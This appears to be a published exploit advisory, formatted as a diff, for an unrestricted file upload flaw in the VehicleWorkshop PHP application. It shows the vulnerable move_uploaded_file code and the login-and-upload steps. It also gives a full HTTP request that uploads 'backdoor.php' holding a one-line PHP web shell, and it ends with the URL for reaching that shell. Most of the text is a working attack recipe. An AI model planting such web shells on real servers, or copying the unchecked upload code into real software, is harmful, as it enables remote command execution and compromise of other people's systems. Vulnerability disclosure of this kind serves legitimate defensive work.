@@ -1,0 +1,108 @@
+# Exploit Title: VehicleWorkshop Unrestricted File Upload or Shell Upload
+# Exploit Author: Touhid M.Shaikh
+# Date: 1/08/2017
+# Vendor Homepage: https://github.com/spiritson/VehicleWorkshop
+# Tested on : Kali Linux 2.0 64 bit and Windows 7
+
+
+
+===================
+Vulnerable Page:
+===================
+
+http://192.168.1.13/sellvehicle.php
+
+====================
+Vulnerable Source:
+====================
+
+
+--------------------------------PHP code-----------
+<?php
+if(isset($_POST["submit"]))
+{
+move_uploaded_file($_FILES["file"]["tmp_name"],
+"upload/" . $_FILES["file"]["name"]);
+
+
+--------------------------------------------------
+
+-----------------------HTML Form -----------------
+<label for="images"></label>
+      <label for="file"></label>
+      <input type="file" name="file" id="file" /><input type="hidden"
+name="image"  />
+
+-----------------------------------------------------------------------
+
+U can upload Shell or File via Regular or customer User Account.
+
+ ================= POC ======================
+
+We need to login any customer account or create an account (
+http://192.168.1.13/registration.php) and login.
+
+After customer panel open Navigate to
+http://192.168.1.13/sellvehicle.php
+
+and feed data and upload you unrestricted file.
+
+--------------------------Request---------------------------
+
+POST /sellvehicle.php HTTP/1.1
+Host: 192.168.1.13
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:54.0) Gecko/20100101
+Firefox/54.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,hi;q=0.8,ar;q=0.5,en;q=0.3
+Content-Type: multipart/form-data;
+boundary=---------------------------144421253520516158491092952973
+Content-Length: 1085
+Referer: http://192.168.1.13/sellvehicle.php
+Cookie: PHPSESSID=ccopsj443v8d2kksu0u40cte10
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+.
+.
+.
+.skip
+
+Content-Disposition: form-data; name="file"; filename="backdoor.php"
+Content-Type: application/x-php
+
+<?php system($_GET['cmd']); ?>
+
+.
+.
+.
+.skip
+------------------------------------------------------------------------------
+
+--------------------------Rsponse --------------------------
+HTTP/1.1 200 OK
+Date: Mon, 31 Jul 2017 20:38:09 GMT
+Server: Apache/2.2.14 (Win32) DAV/2 mod_ssl/2.2.14 OpenSSL/0.9.8l
+mod_autoindex_color PHP/5.3.1
+X-Powered-By: PHP/5.3.1
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Content-Length: 2909
+Connection: close
+Content-Type: text/html
+------------------------------------------------------------------------------
+
+
+====================================================================
+
+Now You Can Access you Shell or File in /upload/backdoor.php
+
+http://192.168.1.13/upload/backdoor.php
+
+
+Enjoy !
+
+Regards.
+Touhid Shaikh
